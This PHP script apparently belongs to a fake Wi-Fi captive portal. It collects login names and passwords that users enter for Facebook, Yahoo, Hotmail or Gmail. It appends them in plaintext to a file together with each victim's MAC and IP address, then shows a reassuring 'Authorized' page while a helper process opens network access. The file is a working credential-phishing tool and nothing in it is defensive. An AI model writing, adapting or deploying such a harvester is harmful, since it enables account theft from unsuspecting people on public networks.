<?php

//Thanks to:
//http://www.andybev.com/index.php/Using_iptables_and_PHP_to_create_a_captive_portal
//http://simple-and-hot.blogspot.com.au/2010/05/you-can-do-it-yourself.html
//devi1

//error_reporting(E_ALL);
//ini_set ('display_errors', '1');

$name = $_POST['login'];
$password = $_POST['password'];

if($_POST['facebook']){
	$service = "facebook";
}elseif($_POST['yahoo']){
	$service = "yahoo";
}elseif($_POST['hotmail']){
	$service = "hotmail";
}elseif($_POST['gmail']){
	$service = "gmail";
}


sleep(1);

$error =
"<html>\n" .
"<head>\n" .
"<meta http-equiv=\"Refresh\" content=\"5;url=/\" />\n" .
"</head>\n" .
"<body>\n" .
"<center><p1><b>Login incorrect.</b></p1></center>\n" .
"<center><p1></p1></center>\n" .
"</body>\n" .
"</html>";

$success=
"<html>\n" .
"<head>\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Authorized</p1></center>\n" .
"<center><p1>Continue browsing</p1></center>\n" .
"</body>\n" .
"</html>";



$arp = "/usr/sbin/arp";

if(($password == "") || ($name == "")){
    echo $error;  // if credentials not entered
} else { 
    // Attempt to get the client's mac address
    $mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
    preg_match('/..:..:..:..:..:../',$mac , $matches);
    @$mac = $matches[0];
 
    // get the client IP address from the query string //Doesn't always work - why not?
    //$ip = $_GET["ip"];    
    //$ip = getenv("HTTP_CLIENT_IP"); 
    $ip = $_SERVER["REMOTE_ADDR"];
    
    global $mac; // necessary to export $mac?

    $accinfo = "login: $name    pass: $password    service: $service\nMAC: $mac    IP: $ip\n----------------\n";

    // Write out the credentials
    $fp = fopen("formdata.txt", "a");
    fwrite($fp, $accinfo);
    fclose($fp);
    
    if (!isset($mac)) { echo $error; 
    } else { 
        // Allow through the captive portal
        //exec("sudo /sbin/iptables -t nat -I PREROUTING -m mac --mac-source $mac -j ACCEPT"); 
        $fp = fopen("/tmp/ip/ip", "w"); // "w" to overwrite previous mac
        fwrite($fp, $mac);
        fclose($fp);
        sleep (2); //for dnotify to read $mac
        echo $success; }
}

//uncomment to debug $_POST variable:
//print_r($_POST);

//uncomment to list name, password, and service variables:
//echo('$name: ' . $name . '<br>$password: ' . $password . '<br>$service: ' . $service);

?>
